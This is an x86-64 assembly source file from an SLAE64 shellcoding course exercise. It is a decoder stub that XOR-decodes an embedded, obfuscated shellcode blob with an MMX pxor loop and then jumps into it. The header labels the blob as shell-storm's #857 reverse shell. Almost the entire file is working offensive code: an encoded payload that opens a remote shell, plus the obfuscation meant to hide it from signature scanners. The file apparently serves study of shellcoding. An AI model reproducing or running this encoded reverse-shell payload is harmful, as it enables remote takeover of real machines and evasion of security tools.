; #857 reverse shell
; based on: http://shell-storm.org/shellcode/files/shellcode-857.php
; RE: https://slightofhands.com/2018/05/21/slae64-1559-0x5_analyze_three_shellcodes/
; Author: Chase Hatch SLAE64-1559
; This is the decoder_stub

section .text
global _start
_start:

origin:
	; zero registers
	lea rbx, [rel origin]
	add bx, 50  ; shellcode offset from origin
	push rbx
	pop rdx

	;decode loop setup
	push dword 0x67656361
	mov [rsp+4], dword 0x88878685 
	movq mm1, [rsp]
	push  15  ; 118 sc len (120) / 8 * 1 pxor rounds
	pop rcx
decode_loop:
	movq mm0, [rbx]
	pxor mm0, mm1
	movq [rbx], mm0
	add bx, 0x8
	loop decode_loop
	jmp rdx
	

	shellcode:  db  0x29,0x52,0xa5,0x2f,0xb4,0x79,0xcf,0xb9,0x97,0x2b,0x54,0xb5,0xc8,0xb7,0x47,0xe2,0x63,0x3c,0x0f,0x66,0xdb,0xec,0x81,0xd2,0x0b,0x4a,0x3d,0x68,0x80,0xcf,0x0e,0x48,0x29,0x52,0x93,0x2a,0xb4,0x54,0xc6,0xda,0xa7,0x67,0x41,0x65,0xe3,0x41,0xc3,0xac,0x63,0x19,0x0c,0xa0,0xc1,0xa2,0x83,0x48,0xc9,0x62,0x6f,0x2f,0x0c,0x60,0xed,0x98,0x3b,0x22,0x35,0x38,0xef,0xac,0xdf,0x87,0x64,0x2b,0x54,0x91,0xef,0x85,0xd9,0xc0,0x9e,0xad,0x0f,0x46,0xdd,0x89,0x82,0xfd,0x97,0x2b,0x54,0x98,0xd2,0xd1,0xd9,0xd2,0x29,0xdc,0x4a,0x48,0xe7,0xef,0xe9,0xa7,0x12,0x0b,0x2d,0xa6,0x6a,0x8e,0xd0,0xdc,0x3e,0x09,0x5e,0x3f,0x8a,0x83

